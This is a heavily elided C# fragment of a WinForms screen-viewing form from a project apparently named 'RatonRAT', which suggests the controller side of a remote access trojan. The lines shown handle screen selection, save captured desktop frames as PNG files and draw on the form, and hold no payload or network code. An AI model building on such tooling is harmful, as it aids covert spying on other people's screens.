...
namespace RatonRAT.ClientForms
{
    public partial class FormRemote : Form
    {
        ...
        {
            if(comboBox1.SelectedItem == null || comboBox1.SelectedText == "No screens :(")
            {
                MessageBox.Show("No screens detected", "Error", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }    
        ...
        private void saveCurrentFrameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ...
            if (Directory.Exists(targetFolder))
            {
                ...
                string filePath = Path.Combine(targetFolder, "Desktop_" + timestamp +".png");
        ...
        private void FormRemote_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3))
